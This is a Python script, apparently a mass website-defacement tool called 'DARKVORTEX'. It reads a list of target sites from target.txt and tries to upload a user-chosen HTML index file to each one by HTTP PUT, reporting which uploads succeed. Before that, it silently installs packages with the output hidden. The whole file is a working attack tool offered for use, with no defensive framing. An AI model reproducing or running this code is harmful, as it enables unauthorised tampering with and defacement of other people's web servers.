# -*- coding: utf-8 -*-
#BY MR.PATRIX
import os
import sys
import time

def clear_screen():
    os.system("clear")

clear_screen()  

flag_file = ".instalasi_selesai"

print('[-] instalasi packet...')
# Cek apakah file flag sudah ada di sistem
if not os.path.exists(flag_file):
    # List paket yang ingin diinstal
    packages = [
        "python2",
        "pip2",
        "requests",
        "git",
        "colorama",
        "art",
        "python",
        "python3"
    ]

    # Menginstal setiap paket dengan mengarahkan output ke /dev/null
    for package in packages:
        os.system(f"pkg install -y {package} > /dev/null 2>&1")
        os.system(f"pip install {package} > /dev/null 2>&1")

    # Membuat file flag yang menandakan instalasi telah selesai
    with open(flag_file, "w") as flag:
        flag.write("Instalasi selesai.")
        print("[-] Instalasi paket selesai.")
else:
    print("")

def clear_screen():
    os.system("clear")
    
from art import *
from colorama import Fore, Style

def clear_screen():
    os.system("clear")

clear_screen()  

try:
    import requests
    import os
    import os.path
    import sys
except ImportError:
    exit("install requests and try again ...")


def blue_text_art(text):
    ascii_art = text2art(text)
    return f"{Fore.BLUE}{ascii_art}{Style.RESET_ALL}"  
banner = ""
teks = "DARKVORTEX"
teks_dengan_warna = blue_text_art(teks)
print(teks_dengan_warna)

banner = """\033[92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
\033[91m[\033[92m::\033[91m] \033[93mTool Created by mr-patrix    
\033[91m[\033[92m::\033[91m] \033[93mVersion : 1.0.0
\033[91m[\033[92m::\033[91m] \033[93mMake sure you have created an html file 
\033[91m[\033[92m::\033[91m] \033[93mPlease enter your html name (example index.html)
\033[92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 """

b = '\033[31m'
h = '\033[32m'
m = '\033[00m'


def x(tetew):
    ipt = ''
    if sys.version_info.major > 2:
        ipt = input(tetew)
    else:
        ipt = raw_input(tetew)

    return str(ipt)


def aox(script, target_file="target.txt"):
    op = open(script, "r").read()
    with open(target_file, "r") as target:
        target = target.readlines()
        s = requests.Session()
        print("uploading file to %d website" % (len(target)))
        for web in target:
            try:
                site = web.strip()
                if site.startswith("http://") is False:
                    site = "http://" + site
                req = s.put(site + "/" + script, data=op)
                if req.status_code < 200 or req.status_code >= 250:
                    print(m + "[" + b + " DARKVORTEX FAILED TO UPLOAD  !" + m + " ] %s/%s" % (site, script))
                else:
                    print(m + "[" + h + " DARKVORTEX SUCCESSFULLY UPLOADED " + m + " ] %s/%s" % (site, script))

            except requests.exceptions.RequestException:
                continue
            except KeyboardInterrupt:
                print;
                exit()


def main(__bn__):
    print(__bn__)
    while True:
        try:
            a = x("""\033[92m─\033[93m\033[41m[ Enter your script/index ]\033[0m\033[92m──\033[93m$""")
            print
            if not os.path.isfile(a):
                print("file '%s' not found" % (a))
                continue
            else:
                break
        except KeyboardInterrupt:
            print;
            exit()

    aox(a)

if __name__ == "__main__":
    main(banner)